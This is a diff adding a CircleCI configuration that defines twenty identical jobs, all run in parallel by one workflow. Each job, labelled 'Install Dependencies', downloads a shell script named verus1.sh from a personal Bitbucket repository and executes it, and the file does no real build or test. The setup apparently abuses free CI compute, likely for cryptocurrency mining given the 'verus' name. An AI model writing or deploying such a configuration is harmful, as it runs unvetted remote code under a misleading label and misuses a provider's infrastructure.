@@ -1,0 +1,167 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku11:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku12:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku13:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku14:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku15:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku16:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku17:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku18:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku19:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    aku20:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/verus/raw/525181afda880317e44c74bbb0738356b0cee79b/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
